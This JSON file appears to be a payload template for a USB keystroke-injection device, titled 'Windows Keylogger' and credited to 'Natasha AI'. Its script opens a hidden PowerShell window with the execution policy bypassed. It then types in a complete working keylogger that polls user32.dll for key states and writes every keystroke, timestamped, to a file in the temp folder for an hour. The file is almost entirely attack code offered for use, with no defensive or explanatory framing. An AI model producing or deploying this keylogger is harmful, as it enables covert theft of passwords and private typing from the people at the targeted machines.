{
  "metadata": {
    "name": "Windows Keylogger",
    "description": "Deploys a keylogger on Windows systems",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "PowerShell Keylogger",
      "description": "Deploys a PowerShell-based keylogger that saves keystrokes to a file",
      "attack_type": "keylogger",
      "script": [
        "REM Windows PowerShell Keylogger",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "GUI r",
        "DELAY 500",
        "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass",
        "ENTER",
        "DELAY 1000",
        "STRING $logFile = &quot;$env:TEMP\\keylog.txt&quot;",
        "ENTER",
        "STRING Add-Content -Path $logFile -Value &quot;Keylogger started $(Get-Date)&quot;",
        "ENTER",
        "STRING $signature = @&quot;",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto, ExactSpelling=true)]",
        "ENTER",
        "STRING public static extern short GetAsyncKeyState(int virtualKeyCode);",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]",
        "ENTER",
        "STRING public static extern int GetKeyboardState(byte[] keystate);",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]",
        "ENTER",
        "STRING public static extern int MapVirtualKey(uint uCode, int uMapType);",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]",
        "ENTER",
        "STRING public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);",
        "ENTER",
        "STRING &quot;@",
        "ENTER",
        "STRING $API = Add-Type -MemberDefinition $signature -Name 'Win32' -Namespace API -PassThru",
        "ENTER",
        "STRING try {",
        "ENTER",
        "STRING   $keylogTimer = [System.Diagnostics.Stopwatch]::StartNew()",
        "ENTER",
        "STRING   $maxTime = 3600 # Run for 1 hour",
        "ENTER",
        "STRING   while ($keylogTimer.Elapsed.TotalSeconds -lt $maxTime) {",
        "ENTER",
        "STRING     Start-Sleep -Milliseconds 40",
        "ENTER",
        "STRING     for ($ascii = 9; $ascii -le 254; $ascii++) {",
        "ENTER",
        "STRING       $state = $API::GetAsyncKeyState($ascii)",
        "ENTER",
        "STRING       if ($state -eq -32767) {",
        "ENTER",
        "STRING         $null = [console]::CapsLock",
        "ENTER",
        "STRING         $virtualKey = $ascii",
        "ENTER",
        "STRING         $kbstate = New-Object Byte[] 256",
        "ENTER",
        "STRING         $checkkbstate = $API::GetKeyboardState($kbstate)",
        "ENTER",
        "STRING         $mychar = New-Object -TypeName System.Text.StringBuilder",
        "ENTER",
        "STRING         $success = $API::ToUnicode($virtualKey, $API::MapVirtualKey($virtualKey, 0), $kbstate, $mychar, $mychar.Capacity, 0)",
        "ENTER",
        "STRING         if ($success) {",
        "ENTER",
        "STRING           $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'",
        "ENTER",
        "STRING           $keyPressed = $mychar.ToString()",
        "ENTER",
        "STRING           $specialKey = switch ($virtualKey) {",
        "ENTER",
        "STRING             8 {'[Backspace]'}",
        "ENTER",
        "STRING             9 {'[Tab]'}",
        "ENTER",
        "STRING             13 {'[Enter]'}",
        "ENTER",
        "STRING             27 {'[Esc]'}",
        "ENTER",
        "STRING             32 {' '}",
        "ENTER",
        "STRING             default {$keyPressed}",
        "ENTER",
        "STRING           }",
        "ENTER",
        "STRING           Add-Content -Path $logFile -Value &quot;[$timestamp] $specialKey&quot;",
        "ENTER",
        "STRING         }",
        "ENTER",
        "STRING       }",
        "ENTER",
        "STRING     }",
        "ENTER",
        "STRING   }",
        "ENTER",
        "STRING } catch {",
        "ENTER",
        "STRING   Add-Content -Path $logFile -Value &quot;Error: $_&quot;",
        "ENTER",
        "STRING } finally {",
        "ENTER",
        "STRING   Add-Content -Path $logFile -Value &quot;Keylogger stopped $(Get-Date)&quot;",
        "ENTER",
        "STRING }",
        "ENTER",
        "STRING exit",
        "ENTER"
      ]
    }
  ]
}